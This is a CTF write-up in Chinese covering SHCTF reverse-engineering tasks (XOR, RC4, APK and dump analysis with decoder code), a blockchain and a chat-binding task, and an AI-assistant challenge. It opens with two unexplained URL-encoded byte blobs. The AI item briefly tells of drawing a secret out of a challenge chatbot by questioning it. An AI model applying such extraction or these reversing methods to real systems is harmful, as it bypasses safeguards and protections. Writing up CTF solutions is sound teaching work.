%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%E0%1B%CE%26%05%9D%29o%D6%25jo%F1%DC%A9%5Bv%FF%C6vL%A9X%E01%22%82U8N%9D%E8%DF%BB%C8%E5%E8%AB%05%2F%0B%04S%216%02%0D.F%BF%2F%16%02ZE%1B%FB%3C%F4%97%12%DBv%921%14%DB%ABKnf%91%85%10%96%F7M%B6%FA%04%AAU%B5%E7%17%F8%E0%21%C9%D7%F7%C8%D5%28y.%C5%8A%1E%FB%2B%AA%7E%E6%87%B0%C1%AF%AFB%60%A8%F4%80M%16P%FEC%E8%F6%D3L%91%A3c%9A%12
%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%E0%1B%CE%26%05%9D%29o%D6%25jo%F1%DC%A9%5Bv%FF%C6%F6L%A9X%E01%22%82U8N%9D%E8%DF%BB%C8%E5%E8%AB%05%2F%0B%04S%216%82%0D.F%BF%2F%16%02ZE%1B%FB%3C%F4%17%12%DBv%921%14%DB%ABKnf%91%85%10%96%F7M%B6%FA%04%AAU%B5g%17%F8%E0%21%C9%D7%F7%C8%D5%28y.%C5%8A%1E%FB%2B%AA%7E%E6%87%B0%C1%AF%AF%C2_%A8%F4%80M%16P%FEC%E8%F6%D3L%11%A3c%9A%12

```



# <font style="color:#DF2A3F;">R</font><font style="color:#D8DAD9;">everse</font>
## <font style="color:#7E45E8;">gamegame</font>
是个数独，直接运行程序，把谜题提出来，然后用网站解一下。

![](../../../../images/cb16d35c4c0e36c9af95456b92caa867.png)

flag 就是 SHCTF 套上按顺序输入的数字。

## <font style="color:#7E45E8;">ezxor</font>
```c
__int64 sub_140014C50()
{
  char *v0; // rdi
  __int64 i; // rcx
  __int64 v2; // rax
  __int64 v3; // rax
  __int64 v4; // rax
  char v6[32]; // [rsp+0h] [rbp-20h] BYREF
  char v7; // [rsp+20h] [rbp+0h] BYREF
  char v8[288]; // [rsp+30h] [rbp+10h] BYREF
  char v9[10]; // [rsp+150h] [rbp+130h]
  char v10[266]; // [rsp+15Ah] [rbp+13Ah] BYREF
  int j; // [rsp+264h] [rbp+244h]
  int v12; // [rsp+284h] [rbp+264h]
  int v13; // [rsp+414h] [rbp+3F4h]

  v0 = &v7;
  for ( i = 162i64; i; --i )
  {
    *(_DWORD *)v0 = -858993460;
    v0 += 4;
  }
  sub_140011514(&unk_140028066);
  sub_140011271("   _____ _    _  _____ _______ ______ \n");
  sub_140011271("  / ____| |  | |/ ____|__   __|  ____|\n");
  sub_140011271(" | (___ | |__| | |       | |  | |__   \n");
  sub_140011271("  \\___ \\|  __  | |       | |  |  __|  \n");
  sub_140011271("  ____) | |  | | |____   | |  | |     \n");
  sub_140011271(" |_____/|_|  |_|\\_____|  |_|  |_|     \n");
  v2 = sub_1400110AA(std::cout, "欢迎来到shctf");
  std::ostream::operator<<(v2, sub_140011046);
  v3 = sub_1400110AA(std::cout, &unk_14001F1B0);
  std::ostream::operator<<(v3, sub_140011046);
  v4 = sub_1400110AA(std::cout, "xxxxxxxooooorrrrrrrr!!");
  std::ostream::operator<<(v4, sub_140011046);
  sub_1400110AA(std::cout, "you input flag:");
  memset(v8, 0, 0xFFui64);
  v9[0] = -61;
  v9[1] = 105;
  v9[2] = 114;
  v9[3] = -60;
  v9[4] = 103;
  v9[5] = 74;
  v9[6] = -24;
  v9[7] = 17;
  v9[8] = 67;
  v9[9] = -49;
  strcpy(v10, "o");
  v10[2] = -13;
  v10[3] = 68;
  v10[4] = 110;
  v10[5] = -8;
  v10[6] = 89;
  v10[7] = 73;
  v10[8] = -24;
  v10[9] = 78;
  v10[10] = 94;
  v10[11] = -30;
  v10[12] = 83;
  v10[13] = 67;
  v10[14] = -79;
  v10[15] = 92;
  memset(&v10[16], 0, 0xE5ui64);
  sub_1400114D8(std::cin, v8);
  for ( j = 0; j < 26; ++j )
  {
    v13 = j % 3;
    if ( j % 3 == 1 )
    {
      v8[j] ^= 0x21u;
    }
    else if ( v13 == 2 )
    {
      v8[j] ^= 0x31u;
    }
    else
    {
      v8[j] ^= 0x90u;
    }
  }
  v12 = 0;
  if ( v9[v12] != v8[v12] )
  {
    sub_1400110AA(std::cout, "not flag");
    exit(1);
  }
  sub_1400110AA(std::cout, "win");
  sub_14001146F(v6, &unk_14001EEF0);
  return 0i64;
}

```

简单异或，其实就相当于异或了 0x902131。

取密文不方便的话可以动调取。

![](../../../../images/d00b67967b7bae6a73b07364201b99ea.png)

## <font style="color:#7E45E8;">ezrc4</font>
```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  __int64 v4[32]; // [rsp+0h] [rbp-418h] BYREF
  __int64 v5[32]; // [rsp+100h] [rbp-318h] BYREF
  char s1[256]; // [rsp+200h] [rbp-218h] BYREF
  char v7[264]; // [rsp+300h] [rbp-118h] BYREF
  unsigned __int64 v8; // [rsp+408h] [rbp-10h]

  v8 = __readfsqword(0x28u);
  puts("   _____ _    _  _____ _______ ______ ");
  puts("   _____ _    _  _____ _______ ______ ");
  puts("  / ____| |  | |/ ____|__   __|  ____|");
  puts(" | (___ | |__| | |       | |  | |__   ");
  puts("  \\___ \\|  __  | |       | |  |  __|  ");
  puts("  ____) | |  | | |____   | |  | |     ");
  puts(" |_____/|_|  |_|\\_____|  |_|  |_|     ");
  puts(asc_20F7);
  puts(asc_2110);
  puts("rrrrrcccc4444444!");
  printf("you input flag:");
  v4[0] = 0x5B3C8F65423FAB21LL;
  v4[1] = 0x691AE7846E05170CLL;
  v4[2] = 0x111F7077C3LL;
  memset(&v4[3], 0, 231);
  v5[0] = 0x212179654B6E6546LL;
  memset(&v5[1], 0, 247);
  __isoc99_scanf("%s21", v7);
  sub_1200(v5, 8LL, &unk_4040);
  sub_12E2(v7, s1, 21LL, &unk_4040);
  if ( !strcmp(s1, v4) )
    printf("flag is correct");
  else
    printf(asc_2166);
  return 0LL;
}

```

进入 sub_12E2，发现在 RC4 的基础上又异或了一个 0x66，直接取数据不方便，远程调试取出来用 CyberChef 直接解。

![](../../../../images/e1eff2dc859cd686282704532bcf4254.png)

key 是 FenKey!!。

![](../../../../images/bc6129bc81eac49ad0d8ab7ad81fd0bd.png)

## <font style="color:#7E45E8;">ezapk</font>
jadx-gui 看一下 apk，发现主要加密逻辑。

```java
package com.mycheck.ezjv;

import adrt.ADRTLogCatReader;
import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

/* loaded from: classes.dex */
public class MainActivity extends Activity {
    byte[] key = {(byte) 12, (byte) 15, (byte) 25, (byte) 30, (byte) 36};

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        ADRTLogCatReader.onContext(this, "com.aide.ui.mgai");
        super.onCreate(bundle);
        setContentView(C0000R.layout.activity_main);
        Check(this);
    }

    public static String Encode(String str, byte[] bArr) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < str.length(); i++) {
            sb.append((char) (((char) (((char) (str.charAt(i) ^ bArr[i % bArr.length])) + 6)) * 2));
        }
        return Base64.getEncoder().encodeToString(sb.toString().getBytes(StandardCharsets.UTF_8));
    }

    public void Check(Context context) {
        ((Button) findViewById(C0000R.id.Button1)).setOnClickListener(new View.OnClickListener(this, (EditText) findViewById(C0000R.id.test1), context) { // from class: com.mycheck.ezjv.MainActivity.100000000
            private final MainActivity this$0;
            private final Context val$context;
            private final EditText val$myedit;

            {
                this.this$0 = this;
                this.val$myedit = r9;
                this.val$context = context;
            }

            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                if (!MainActivity.Encode(this.val$myedit.getText().toString(), this.this$0.key).equals("woLDgMOgw7hEwoJQw7zDtsKow7TDpMOMZMOow75QxIbDnsKmw6Z4UMK0w7rCklDCrMKqwqbDtMOOw6DDsg==")) {
                    Toast.makeText(this.val$context, "Wrong! Try again~", 1).show();
                } else {
                    Toast.makeText(this.val$context, "You Win!!", 1).show();
                }
            }
        });
    }
}

```

逆着写即可，需要注意 byte 和 char 的范围问题，不然跑出来都是乱码。

```java
import java.nio.charset.StandardCharsets;

public class Decoder {

    byte[] key = {(byte) 12, (byte) 15, (byte) 25, (byte) 30, (byte) 36};

    public static String Decode(byte[] bArr) {
        int[] decodedBytes = {130,192,224,248,68,130,80,252,246,168,244,228,204,100,232,254,80,262,222,166,230,120,80,180,250,146,80,172,170,166,244,206,224,242};
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < decodedBytes.length; i++) {
            char c = (char) (decodedBytes[i] / 2);
            c = (char) (c - 6);
            c = (char) (c ^ bArr[i % bArr.length]);
            sb.append(c);
        }
        return sb.toString();
    }

    public static void main(String[] args) {
        Decoder decoder = new Decoder();
        String decodedStr = decoder.Decode(decoder.key);
        System.out.println("Decoded String: " + decodedStr);
    }
}
//Decoded String: 7Ush87-akjxcy2Ju-dwia9;JSO-IQixnsm

```

## <font style="color:#7E45E8;">EzDBG</font>
拿到 dmp 和 pdb 文件，用 windbg 打开，加载一下符号表 pdb，然后打开 dmp。

```plain
!sym noisy
ld EzDBG

```

alt + 7 看一下汇编，进到 main 函数，发现主要逻辑。

![](../../../../images/b88737bae096e64eb2d972e0634f39bf.png)

![](../../../../images/eaa7080f5ca77541f3d4048a65e49f49.png)

就是一个异或 0x66 的操作，在 memory 里面找一下密文 enc。

![](../../../../images/05dc443fa627a5cdec57905e47586346.png)

丢入 CyberChef 跑一下。

![](../../../../images/74950bf991411a303010e4527ce920c5.png)



# <font style="color:#DF2A3F;">B</font><font style="color:#D8DAD9;">lockchain</font>
## <font style="color:#7E45E8;">just Signin</font>
生涯中第一道区块链竟是非预期（

题目给了合约地址，猜测出题人肯定测过题，于是直接去查交易记录。

翻到最早的交易，把输入解密，在末尾能发现 flag。

(这题第一天做的，当时能查到记录，现在查不到了)

# <font style="color:#DF2A3F;">P</font><font style="color:#D8DAD9;">PC</font>
## <font style="color:#7E45E8;">绑定QQ账号</font>
开启容器生成临时身份码，群里发 #bind {临时身份码}，然后刷新容器得到 flag。

# <font style="color:#DF2A3F;">A</font><font style="color:#D8DAD9;">I</font>
## <font style="color:#7E45E8;">小助手</font>
这个 AI 比较菜，稍微问一下就出了。

![](../../../../images/5859cd6653f757806a1726d9300c0249.png)

